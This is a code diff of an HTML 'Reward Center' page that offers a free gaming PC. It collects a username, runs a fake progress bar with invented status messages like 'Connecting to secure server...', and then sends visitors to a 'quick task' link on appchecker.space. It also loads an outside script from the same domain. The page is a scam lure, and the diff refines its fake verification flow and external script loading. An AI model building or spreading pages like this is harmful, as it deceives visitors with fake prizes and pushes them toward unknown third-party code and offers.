@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Gaming Reward Center</title>
+<title>Reward Center</title>
 
 <script type="text/javascript" id="ogjs" src="https://appchecker.space/cl/js/271x3k"></script>
 
@@ -18,7 +18,7 @@ body {
 
 .container {
     max-width:350px;
-    margin:50px auto;
+    margin:40px auto;
     padding:20px;
     background:#111827;
     border-radius:15px;
@@ -30,8 +30,9 @@ img {
     border-radius:10px;
 }
 
-h1 {
-    font-size:22px;
+h2 {
+    margin-top:10px;
+    font-weight:normal;
 }
 
 input {
@@ -54,14 +55,29 @@ button {
     cursor:pointer;
 }
 
-button:hover {
-    background:#16a34a;
-}
-
 .hidden {
     display:none;
 }
 
+/* STEP BAR */
+.steps {
+    display:flex;
+    justify-content:space-between;
+    margin:15px 0;
+    font-size:12px;
+}
+
+.step {
+    flex:1;
+    padding:5px;
+    border-bottom:3px solid #333;
+}
+
+.active {
+    border-color:#22c55e;
+}
+
+/* LOADING */
 .loading {
     width:100%;
     height:10px;
@@ -76,6 +92,10 @@ button:hover {
     background:#22c55e;
     border-radius:10px;
 }
+
+.final-box {
+    margin-top:20px;
+}
 </style>
 </head>
 
@@ -83,49 +103,72 @@ button:hover {
 
 <div class="container">
 
-<img src="https://i.imgur.com/6Iej2c3.jpg">
+<img src="https://www.image2url.com/r2/default/images/1776226871582-a28e549c-c1cf-4692-a072-84383c4c7016.jpg">
 
-<h1>Gaming Reward Center</h1>
-<p>Unlock your reward today</p>
+<h2>Unlock your reward</h2>
 
+<!-- STEP BAR -->
+<div class="steps">
+<div class="step active" id="s1">Step 1</div>
+<div class="step" id="s2">Step 2</div>
+<div class="step" id="s3">Step 3</div>
+</div>
+
+<!-- STEP 1 -->
 <div id="step1">
 <input type="text" id="username" placeholder="Enter your username">
-<button onclick="nextStep()">Start Now</button>
+<button onclick="goStep2()">Continue</button>
 </div>
 
+<!-- STEP 2 -->
 <div id="step2" class="hidden">
-<p>Select your reward</p>
-
-<button onclick="process()">💻 Gaming PC</button>
-<button onclick="process()">🎧 Gaming Setup</button>
-<button onclick="process()">🖥️ RGB Desktop</button>
+<p>Select reward</p>
+<button onclick="startProcess()">💻 Gaming PC</button>
+<button onclick="startProcess()">🎧 Gaming Setup</button>
+<button onclick="startProcess()">🖥️ RGB Desktop</button>
 </div>
 
+<!-- STEP 3 -->
 <div id="step3" class="hidden">
 <p id="status">Checking availability...</p>
 
 <div class="loading">
 <div class="bar" id="bar"></div>
 </div>
+
+<div class="final-box hidden" id="finalBox">
+<p>Final step: complete a quick task</p>
+<a href="https://appchecker.space/cl/i/271x3k">
+<button>Continue</button>
+</a>
+</div>
+
 </div>
 
 </div>
 
 <script>
-function nextStep(){
-    var user = document.getElementById("username").value;
-    if(user == ""){
+
+function goStep2(){
+    let user = document.getElementById("username").value;
+    if(user==""){
         alert("Enter username first");
         return;
     }
 
     document.getElementById("step1").style.display="none";
     document.getElementById("step2").style.display="block";
+
+    document.getElementById("s1").classList.remove("active");
+    document.getElementById("s2").classList.add("active");
 }
 
-function process(){
+function startProcess(){
     document.getElementById("step2").style.display="none";
     document.getElementById("step3").style.display="block";
+
+    document.getElementById("s2").classList.remove("active");
+    document.getElementById("s3").classList.add("active");
 
     let bar = document.getElementById("bar");
     let status = document.getElementById("status");
@@ -135,28 +178,28 @@ function process(){
     let interval = setInterval(function(){
         if(width >= 100){
             clearInterval(interval);
-            status.innerHTML = "Final step: complete quick task";
 
-            setTimeout(function(){
-                window.location.href = "https://appchecker.space/cl/i/271x3k";
-            },2000);
+            status.innerHTML = "Reward ready. Final verification required.";
+
+            document.getElementById("finalBox").style.display="block";
 
         } else {
             width++;
             bar.style.width = width + "%";
 
             if(width == 30){
-                status.innerHTML = "Connecting to server...";
+                status.innerHTML = "Connecting to secure server...";
             }
             if(width == 60){
                 status.innerHTML = "Verifying request...";
             }
             if(width == 90){
-                status.innerHTML = "Preparing reward...";
+                status.innerHTML = "Preparing delivery...";
             }
         }
     },40);
 }
+
 </script>
 
 </body>
